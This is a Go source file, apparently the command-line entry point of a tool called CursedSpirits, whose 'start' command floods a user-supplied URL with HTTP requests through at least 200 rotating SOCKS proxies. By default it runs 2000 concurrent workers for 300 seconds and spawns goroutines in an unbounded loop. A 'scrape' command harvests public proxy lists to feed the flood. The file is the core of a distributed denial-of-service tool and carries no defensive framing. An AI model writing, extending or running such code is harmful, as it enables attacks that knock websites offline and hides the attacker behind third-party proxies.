package cmd

import (
	"Pix4Devs/CursedSpirits/bot"
	"Pix4Devs/CursedSpirits/fancy"
	"Pix4Devs/CursedSpirits/filesystem"
	"Pix4Devs/CursedSpirits/globals"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Pix4Devs/pix4lib"
	"github.com/Pix4Devs/pix4lib/proxyscraper"
	"github.com/spf13/cobra"
)

var RootCmd = &cobra.Command{
	Use: "./CursedSpirits",
}

var (
	TARGET = &globals.TARGET
	CONCURRENCY = &globals.CONCURRENCY
	DURATION = &globals.DURATION
	PROXY_TYPE = &globals.PROXY_TYPE
	VALID_PROTOCOLS = &globals.VALID_PROTOCOLS
)

var SubCommands = []*cobra.Command{
	{
		Use: "start",
		Short: "Starts the flood",
		Run: func(cmd *cobra.Command, args []string) {
			startFlood()
		},
	},
	{
		Use: "scrape",
		Short: "Scrape proxies",
		Run: func(cmd *cobra.Command, args []string) {
			scrapeCmd(cmd)
		},
	},
	{
		Use: "version",
		Short: "Prints out the current VERSION of CursedSpirits",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Printf("[VERSION] %s", globals.VERSION)
		},
	},
}


func Init(){
	RootCmd.AddCommand(SubCommands...)
	{
		// FLAGS for command 'start'
		SubCommands[0].Flags().StringVar(TARGET,"url","","Sets target URL, requires http:// or https:// scheme included!")
		SubCommands[0].MarkFlagRequired("url")

		{
			SubCommands[0].Flags().IntVar(CONCURRENCY,"concurrency",2000,"Set concurrency accross requests")
			SubCommands[0].Flags().IntVar(DURATION,"duration",300,"Sets flood duration in seconds")
			SubCommands[0].Flags().StringVar(PROXY_TYPE,"protocol","socks4","Sets proxy type, can be one of socks4 or socks5")
		}
		
		// FLAGS for command 'scrape'
		SubCommands[1].Flags().Int("timeout", 1000, "Defines timeout in seconds for proxy scraping")
		SubCommands[1].MarkFlagRequired("timeout")

		// Add subcommand for 'scrape' parent command
		SubCommands[1].AddCommand(&cobra.Command{
			Use: "info",
			Short: "Prints out information such as the API scrape command uses and the version of the scraper",
			Run: func(cmd *cobra.Command, args []string) {
				defer os.Exit(0)
				fmt.Printf("[LIB VERSION]\n%s\n=====\n[API]\n%s",
				pix4lib.VERSION, 
				strings.Replace(proxyscraper.API,"v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all","",1))
			},
		})
	}
}

func startFlood(){
	if !strings.Contains(*TARGET, "http://") && !strings.Contains(*TARGET, "https://") {
		log.Fatal("http:// or https:// scheme required for 'url' option, see <bin> -help for more info")
	}

	var valid bool
	ref := *VALID_PROTOCOLS

	for i := 0; i < len(ref); i++ {
		if ref[i] == *PROXY_TYPE {
			valid = true
			break
		}
	}
	
	if !valid {
		log.Fatal("Proxy protocol can be only socks4 or socks5, see <bin> -help for more info")
	}
	
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	base, err := os.Getwd(); if err != nil {
		log.Fatal(err)
	}

	fileEntry := map[string]interface{}{
		"accepts.txt": &globals.ACCEPTS,
		"proxies.txt": &globals.PROXIES,
		"refs.txt":    &globals.REFS,
	}

	for k, v := range fileEntry {
		data := filesystem.Read(filepath.Join(base,"context",k))
		*v.(*[]string) = data
	}

	v, _ := fileEntry["proxies.txt"].(*[]string)
	if(len(*v) < 200) {
		log.Fatal("Requires minimum of 200 proxies")
	}

	f := &bot.FloodCtx{
		Target: *TARGET,
		Concurrency: *CONCURRENCY,
		StopAt: int(time.Now().Add(time.Second * time.Duration(*DURATION)).Unix()),
		Client: &http.Client{
			Jar: http.DefaultClient.Jar,
			Timeout: time.Duration(time.Second * 20),
		},
		Protocol: *PROXY_TYPE,
	}

	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
	fmt.Println()

	for {
		go func(){
			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
		}()
	}
}

func scrapeCmd(cmd *cobra.Command){
	defer os.Exit(0)
			
	tmOut, err := strconv.Atoi(cmd.Flags().Lookup("timeout").Value.String())
	if err != nil {
		log.Fatal(err)
	}

	c := proxyscraper.NewClient(time.Duration(time.Second * time.Duration(tmOut)))
	proxies, err := c.Execute(); if err != nil {
		log.Fatal(err)
	}
	
	base, err := os.Getwd(); if err != nil {
		log.Fatal(err)
	}
	file, err := os.OpenFile(filepath.Join(base,"context","proxies.txt"), os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	
	file.WriteString(strings.Join(proxies, "\n"))
	fmt.Printf("[SCRAPER INFO]\nScraped with success!")
}